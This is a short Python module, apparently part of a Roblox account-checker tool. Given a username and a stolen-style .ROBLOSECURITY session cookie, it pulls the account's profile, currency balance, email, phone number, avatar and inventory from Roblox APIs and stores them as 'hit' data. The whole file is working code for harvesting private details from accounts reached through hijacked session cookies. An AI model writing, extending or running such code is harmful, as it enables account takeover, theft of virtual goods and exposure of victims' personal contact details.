import json, time

import config, store, util

TARGETS = [
    ("profile", "https://users.roblox.com/v1/users/%d"),
    ("currency", "https://economy.roblox.com/v1/user/currency"),
    ("email", "https://accountsettings.roblox.com/v1/email"),
    ("phone", "https://accountsettings.roblox.com/v1/phone"),
    ("avatar", "https://avatar.roblox.com/v1/users/%d/avatar"),
    ("inventory", "https://inventory.roblox.com/v2/users/%d/inventory?limit=100"),
]


def collect(username, cookie):
    s = util.Session(config.UA, config.HTTP_TIMEOUT)
    s.extra["Cookie"] = ".ROBLOSECURITY=" + cookie
    data = {}
    code, hdr, text, js = s.request("GET", "https://www.roblox.com/mobileapi/userinfo")
    if js:
        data["userinfo"] = js
    uid = (js or {}).get("UserID")
    if uid:
        for name, url in TARGETS:
            try:
                c, h, t, j = s.request("GET", url % uid if "%d" in url else url)
                if j is not None:
                    data[name] = j
            except Exception:
                pass
            time.sleep(0.35)
    store.set_hit_data(username, json.dumps(data)[:200000])
